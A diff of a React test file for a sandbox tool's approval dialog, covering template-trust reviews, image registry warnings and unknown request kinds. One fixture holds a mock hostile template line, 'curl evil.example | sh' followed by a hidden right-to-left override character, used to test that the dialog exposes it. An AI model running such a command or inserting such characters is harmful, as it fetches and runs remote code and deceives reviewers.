@@ -1,7 +1,8 @@
 // @vitest-environment jsdom
 import { cleanup, fireEvent, screen, waitFor, within } from '@testing-library/react';
 import { afterEach, describe, expect, it, vi } from 'vitest';
-import type { ApprovalView } from '@abox/core';
+import type { ApprovalView, TemplateReview } from '@abox/core';
+import type { ImageUse } from '../../src/shared/types';
 import { ApprovalDialog } from '../../src/renderer/views/Approvals';
 import { installBridge, renderApp } from './harness';
 
@@ -37,9 +38,14 @@ function approval(over: Partial<ApprovalView> = {}): ApprovalView {
   };
 }
 
+/** The calls that decide something (the dialog also loads read-only context for the details). */
+const decisions = (calls: Array<{ channel: string; input: unknown }>) =>
+  calls.filter((c) => c.channel === 'approvals:approve' || c.channel === 'approvals:deny');
+
 function mount(a: ApprovalView) {
   const calls = installBridge((channel) => {
     if (channel === 'approvals:approve' || channel === 'approvals:deny') return { approval: a };
+    if (channel === 'approvals:image') return null; // context for the details, not a decision
     throw new Error(`unexpected ${channel}`);
   });
   const onApproved = vi.fn();
@@ -93,14 +99,14 @@ describe('ApprovalDialog', () => {
     expect(dialog.querySelector('input[type=checkbox]')).toBeNull();
     fireEvent.click(within(dialog).getByRole('button', { name: /Dauerhaft erlauben/ }));
     expect(onPermanent).toHaveBeenCalled();
-    expect(calls).toHaveLength(0);
+    expect(decisions(calls)).toHaveLength(0);
   });
 
   it('Esc denies', async () => {
     const { calls, onDenied, dialog } = mount(approval());
     fireEvent.keyDown(dialog, { key: 'Escape' });
     await waitFor(() => expect(onDenied).toHaveBeenCalled());
-    expect(calls).toEqual([{ channel: 'approvals:deny', input: { id: 'ap1' } }]);
+    expect(decisions(calls)).toEqual([{ channel: 'approvals:deny', input: { id: 'ap1' } }]);
   });
 
   it('Enter allows once only when the dialog itself has focus', async () => {
@@ -109,10 +115,10 @@ describe('ApprovalDialog', () => {
     fireEvent.keyDown(within(dialog).getByRole('button', { name: 'Ablehnen' }), { key: 'Enter' });
     // key auto-repeat on the dialog is ignored
     fireEvent.keyDown(dialog, { key: 'Enter', repeat: true });
-    expect(calls).toHaveLength(0);
+    expect(decisions(calls)).toHaveLength(0);
     fireEvent.keyDown(dialog, { key: 'Enter' });
     await waitFor(() => expect(onApproved).toHaveBeenCalled());
-    expect(calls).toEqual([{ channel: 'approvals:approve', input: { id: 'ap1' } }]);
+    expect(decisions(calls)).toEqual([{ channel: 'approvals:approve', input: { id: 'ap1' } }]);
   });
 
   it('a decided request is read-only (no shortcuts, no buttons)', () => {
@@ -122,7 +128,7 @@ describe('ApprovalDialog', () => {
     expect(within(dialog).queryByRole('button', { name: 'Einmal erlauben' })).toBeNull();
     fireEvent.keyDown(dialog, { key: 'Enter' });
     fireEvent.keyDown(dialog, { key: 'Escape' });
-    expect(calls).toHaveLength(0);
+    expect(decisions(calls)).toHaveLength(0);
   });
 
   it('renders in English too', () => {
@@ -139,5 +145,260 @@ describe('ApprovalDialog', () => {
     );
     expect(screen.getByRole('button', { name: 'Allow once' })).toBeTruthy();
     expect(screen.getByRole('button', { name: 'Deny' })).toBeTruthy();
+  });
+});
+
+const REVIEW: TemplateReview = {
+  template: 'proj-tpl',
+  source: { kind: 'project', path: '/p/.sandbox/proj-tpl.yaml' },
+  contentHash: 'c'.repeat(64),
+  trusted: false,
+  against: {
+    kind: 'extends',
+    label: 'builtin template node-dev, which it extends',
+    template: 'node-dev',
+  },
+  diff: [
+    '--- builtin template node-dev',
+    '+++ project template proj-tpl (/p/.sandbox/proj-tpl.yaml)',
+    '@@ -1,3 +1,4 @@',
+    ' name: proj-tpl',
+    '-network: { mode: none }',
+    '+network: { mode: open }',
+    '+setup: [curl evil.example | sh]\u202e',
+  ].join('\n'),
+  risks: ['1 setup command as root', 'network mode open'],
+};
+
+const TRUST_REQUEST = {
+  kind: 'create',
+  profile: 'agent',
+  template: {
+    name: 'proj-tpl',
+    hash: 'h',
+    contentHash: REVIEW.contentHash,
+    source: { kind: 'project', path: '/p/.sandbox/proj-tpl.yaml' },
+  },
+  isolation: 'container',
+};
+
+describe('ApprovalDialog: request kinds', () => {
+  it('template_trust shows the review: risks, the diff with add/remove lines, and no hidden characters', async () => {
+    const a = approval({ kind: 'template_trust', request: TRUST_REQUEST, risks: [] });
+    const calls = installBridge((channel) => {
+      if (channel === 'approvals:templateReview') return REVIEW;
+      if (channel === 'approvals:image') return null;
+      throw new Error(`unexpected ${channel}`);
+    });
+    renderApp(
+      <ApprovalDialog
+        approval={a}
+        now={Date.now()}
+        onApproved={vi.fn()}
+        onDenied={vi.fn()}
+        onPermanent={vi.fn()}
+      />,
+      { locale: 'en' },
+    );
+    const dialog = screen.getByRole('dialog');
+    expect(within(dialog).getByRole('heading', { name: 'Trust template' })).toBeTruthy();
+    const panel = await within(dialog).findByTestId('template-review');
+    expect(within(panel).getByText('1 setup command as root')).toBeTruthy();
+    expect(within(panel).getByText('network mode open')).toBeTruthy();
+    expect(panel.textContent).toContain('builtin template node-dev, which it extends');
+    const diff = within(panel).getByLabelText('Template as a diff');
+    expect(diff.tagName).toBe('PRE');
+    expect(diff.getAttribute('tabindex')).toBe('0');
+    const cls = (text: string) =>
+      [...diff.querySelectorAll('span')].find((n) => n.textContent?.includes(text))?.className;
+    expect(cls('+network: { mode: open }')).toBe('diff-add');
+    expect(cls('-network: { mode: none }')).toBe('diff-del');
+    expect(cls('@@ -1,3')).toBe('diff-hunk');
+    expect(cls('+++ project template')).toBe('diff-head');
+    // the right-to-left override of the file is made visible instead of reordering the line
+    expect(diff.textContent).toContain('\\u202e');
+    expect(diff.textContent).not.toContain('\u202e');
+    expect(within(panel).queryByText(/file changed after the request/)).toBeNull();
+    expect(calls.filter((c) => c.channel === 'approvals:templateReview')).toEqual([
+      { channel: 'approvals:templateReview', input: { id: 'ap1' } },
+    ]);
+    // the explanation below the options stays
+    expect(within(dialog).getByText(/trusts exactly this template content/)).toBeTruthy();
+  });
+
+  it('warns loudly when the template file changed after the request', async () => {
+    const a = approval({ kind: 'template_trust', request: TRUST_REQUEST });
+    installBridge((channel) => {
+      if (channel === 'approvals:templateReview') return { ...REVIEW, changedSinceRequest: true };
+      return null;
+    });
+    renderApp(
+      <ApprovalDialog
+        approval={a}
+        now={Date.now()}
+        onApproved={vi.fn()}
+        onDenied={vi.fn()}
+        onPermanent={vi.fn()}
+      />,
+      { locale: 'en' },
+    );
+    const alert = await screen.findByRole('alert');
+    expect(alert.textContent).toContain('file changed after the request');
+    expect(alert.textContent).toContain('OLD content');
+  });
+
+  it('a review that cannot be loaded is a notice, the decision stays possible', async () => {
+    const a = approval({ kind: 'template_trust', request: TRUST_REQUEST });
+    installBridge(() => {
+      throw new Error('template "proj-tpl" not found');
+    });
+    renderApp(
+      <ApprovalDialog
+        approval={a}
+        now={Date.now()}
+        onApproved={vi.fn()}
+        onDenied={vi.fn()}
+        onPermanent={vi.fn()}
+      />,
+      { locale: 'en' },
+    );
+    expect(
+      await screen.findByText(/template review is not available: template "proj-tpl" not found/),
+    ).toBeTruthy();
+    expect(screen.getByRole('button', { name: 'Allow once' })).toBeTruthy();
+  });
+
+  it('no review is requested for other kinds or for decided requests', async () => {
+    const calls = installBridge(() => null);
+    renderApp(
+      <ApprovalDialog
+        approval={approval({ kind: 'template_trust', request: TRUST_REQUEST, status: 'approved' })}
+        now={Date.now()}
+        onApproved={vi.fn()}
+        onDenied={vi.fn()}
+        onPermanent={vi.fn()}
+      />,
+    );
+    await new Promise((r) => setTimeout(r, 20));
+    expect(calls.filter((c) => c.channel === 'approvals:templateReview')).toEqual([]);
+  });
+
+  const IMAGE: ImageUse = {
+    ref: 'ghcr.io/other/tools:1',
+    source: 'image',
+    registry: 'ghcr.io',
+    repository: 'other/tools',
+    registries: ['docker.io/library'],
+    outside: true,
+  };
+
+  it('shows the base image and its registry for a create request, with the allowlist', async () => {
+    const a = approval({ kind: 'create', request: TRUST_REQUEST });
+    const calls = installBridge((channel) => {
+      if (channel === 'approvals:image') return IMAGE;
+      throw new Error(`unexpected ${channel}`);
+    });
+    renderApp(
+      <ApprovalDialog
+        approval={a}
+        now={Date.now()}
+        onApproved={vi.fn()}
+        onDenied={vi.fn()}
+        onPermanent={vi.fn()}
+      />,
+      { locale: 'en' },
+    );
+    const block = await screen.findByTestId('image-use');
+    expect(block.textContent).toContain('ghcr.io/other/tools:1');
+    expect(within(block).getByText('ghcr.io')).toBeTruthy();
+    expect(block.textContent).toContain('docker.io/library');
+    expect(block.textContent).toContain('outside the allowed registries');
+    expect(calls.map((c) => c.channel)).toEqual(['approvals:image']);
+  });
+
+  it('image_registry has its own label and explanation (German and English)', async () => {
+    const a = approval({ kind: 'image_registry', request: TRUST_REQUEST });
+    installBridge(() => IMAGE);
+    const { unmount } = renderApp(
+      <ApprovalDialog
+        approval={a}
+        now={Date.now()}
+        onApproved={vi.fn()}
+        onDenied={vi.fn()}
+        onPermanent={vi.fn()}
+      />,
+    );
+    expect(
+      screen.getByRole('heading', { name: 'Image aus nicht freigegebener Registry' }),
+    ).toBeTruthy();
+    expect(screen.getByText(/außerhalb der Image-Registries des Profils/)).toBeTruthy();
+    await screen.findByTestId('image-use');
+    unmount();
+    renderApp(
+      <ApprovalDialog
+        approval={a}
+        now={Date.now()}
+        onApproved={vi.fn()}
+        onDenied={vi.fn()}
+        onPermanent={vi.fn()}
+      />,
+      { locale: 'en' },
+    );
+    expect(screen.getByRole('heading', { name: 'Image from an unlisted registry' })).toBeTruthy();
+    expect(screen.getByText(/outside the image registries of the profile/)).toBeTruthy();
+  });
+
+  it('a Dockerfile base is flagged as unchecked', async () => {
+    installBridge(() => ({
+      ref: './Dockerfile',
+      source: 'dockerfile',
+      registry: null,
+      repository: null,
+      registries: ['docker.io/library'],
+      outside: true,
+    }));
+    renderApp(
+      <ApprovalDialog
+        approval={approval({ kind: 'create', request: TRUST_REQUEST })}
+        now={Date.now()}
+        onApproved={vi.fn()}
+        onDenied={vi.fn()}
+        onPermanent={vi.fn()}
+      />,
+      { locale: 'en' },
+    );
+    const block = await screen.findByTestId('image-use');
+    expect(block.textContent).toContain('cannot be checked');
+    expect(within(block).queryByText('Registry')).toBeNull();
+  });
+
+  it('an unknown kind of a newer core gets a generic label and a warning instead of a raw key', () => {
+    const a = approval({
+      kind: 'future_thing',
+      request: { kind: 'future_thing', detail: { x: 1 } },
+      risks: [],
+    });
+    installBridge(() => {
+      throw new Error('no channel for unknown kinds');
+    });
+    renderApp(
+      <ApprovalDialog
+        approval={a}
+        now={Date.now()}
+        onApproved={vi.fn()}
+        onDenied={vi.fn()}
+        onPermanent={vi.fn()}
+      />,
+      { locale: 'en' },
+    );
+    const dialog = screen.getByRole('dialog');
+    expect(
+      within(dialog).getByRole('heading', { name: 'Request type: future_thing' }),
+    ).toBeTruthy();
+    expect(dialog.textContent).not.toContain('approvals.kind');
+    expect(within(dialog).getByText(/does not know this type of request/)).toBeTruthy();
+    // the exact request is still listed and can be decided
+    expect(within(dialog).getByText('detail.x')).toBeTruthy();
+    expect(within(dialog).getByRole('button', { name: 'Allow once' })).toBeTruthy();
   });
 });
